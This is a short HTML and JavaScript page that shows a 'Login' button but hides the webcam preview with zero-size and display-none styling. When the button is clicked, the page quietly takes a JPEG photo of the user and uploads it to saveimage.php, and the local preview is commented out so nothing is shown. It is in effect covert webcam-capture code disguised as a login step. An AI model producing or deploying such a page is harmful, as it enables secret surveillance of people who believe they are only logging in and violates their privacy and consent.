 <!-- CSS -->
 <style>
#my_camera{
 width: 0px !important;
 height: 0px !important;
}
video{
    display: none;
}
</style>

<!-- -->
<center>
<div id="my_camera" ></div>
<br />
<input type=button value="Login" onClick="take_snapshot()">
<!-- <div id="results" ></div> -->
 </center>
<!-- Script -->
<script type="text/javascript" src="webcam.min.js"></script>

<!-- Code to handle taking the snapshot and displaying it locally -->
<script language="JavaScript">

 // Configure a few settings and attach camera
 Webcam.set({
  width: 320,
  height: 240,
  image_format: 'jpeg',
  jpeg_quality: 90
 });
 Webcam.attach( '#my_camera' );
function take_snapshot() {

 // take snapshot and get image data
 Webcam.snap( function(data_uri) {
    Webcam.upload( data_uri, 'saveimage.php', function(code, text,Name) {
            //         document.getElementById('results').innerHTML = 
            //         '' + 
			// '<img src="' + data_uri + '"style=" width: 300px;">';
 } );
  
  
 } );
}

</script>